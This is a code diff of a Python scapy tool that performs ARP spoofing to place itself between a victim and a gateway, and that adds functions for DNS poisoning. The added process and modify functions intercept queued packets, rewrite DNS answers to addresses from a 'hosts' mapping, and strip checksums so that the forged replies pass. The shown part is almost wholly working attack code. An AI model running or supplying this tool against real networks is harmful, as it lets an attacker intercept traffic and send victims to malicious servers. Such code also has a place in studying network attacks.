@@ -1,6 +1,8 @@
 import os
 import scapy.all as scapy
 
+from hosts import hosts
+
 def enable_ip_forwarding():
     """
     Enables IP forwarding for all operating systems
@@ -10,6 +12,7 @@ def enable_ip_forwarding():
         from services import WService
         service = WService("RemoteAccess")
         service.start()
+        pass
     else:
         file_path = "/proc/sys/net/ipv4/ip_forward"
         with open(file_path) as f:
@@ -74,7 +77,7 @@ def spoof(victim_ip, gateway, output):
 
     if output:
         attacker_mac = scapy.ARP().hwsrc
-        print(f"[+] Sent to {victim_ip} : {gateway} is at {attacker_mac}")
+        print(f"\n [+] Sent to {victim_ip} : {gateway} is at {attacker_mac}", end="")
 
 def restore(dest_ip, source_ip, output):
     """
@@ -89,5 +92,70 @@ def restore(dest_ip, source_ip, output):
     scapy.send(packet, count=5, verbose=False)
 
     if output:
-        print(f"[+] Sent to {dest_ip}: {source_ip} is at {source_mac}")
+        print(f"\n[+] Sent to {dest_ip}: {source_ip} is at {source_mac}", end="")
+    
+def process(packet, output):
+    """
+    Processes the packet received to start modifying it
+
+    Step 1: Convert the Netfilter queue packet to Scapy packet (sPacket)
+    Step 2: Check if the packet is a DNS response that we want to poison
+    Step 3: Modify the scapy packet
+    Step 4: Convert back to Netfilter queue packet
+    Step 5: Accept the packet
+    """
+
+    # Step 1
+    sPacket = scapy.IP(packet.get_payload())
+
+    # Step 2
+    if sPacket.haslayer(DNSRR):
+        if (output):
+            print("\n [+] Original: ", sPacket.summary())
+
+        try:
+            # Step 3
+            sPacket = modify(sPacket, output)
+        except IndexError:
+            pass
+
+        if (output):
+            print("\n [+] Poisoned: ", sPacket.summary())
+
+        # Step 4
+        packet.set_payload(bytes(sPacket))
+    
+    # Step 5
+    packet.accept()
+
+def modify(packet, output):
+    """
+    Modifies the packet received
+    It will change the DNSRR based on our poisoned mapping
+
+    Step 1: Get the domain name (Question name)
+    Step 2: If the domain is not in poisoned dictionary, ignore it
+    Step 3: Creating new answer
+    Note: When we modify the answer, checksums and length will be changed.
+    So we will delete it and scapy takes care of appending new ones.
+    """
+
+    # Step 1
+    domain = packet[DNSQR].qname
+
+    # Step 2
+    if domain not in hosts:
+        print(f"\n [+] Domain {domain} not in the list.", end="")
+        return packet
+
+    # Step 3
+    packet[DNS].an = scapy.DNSRR(rrname=domain, rdata=hosts[domain])
+    packet[DNS].ancount = 1
+    
+    del packet[IP].len
+    del packet[IP].chksum
+    del packet[UDP].len
+    del packet[UDP].chksum
+
+    return packet
     
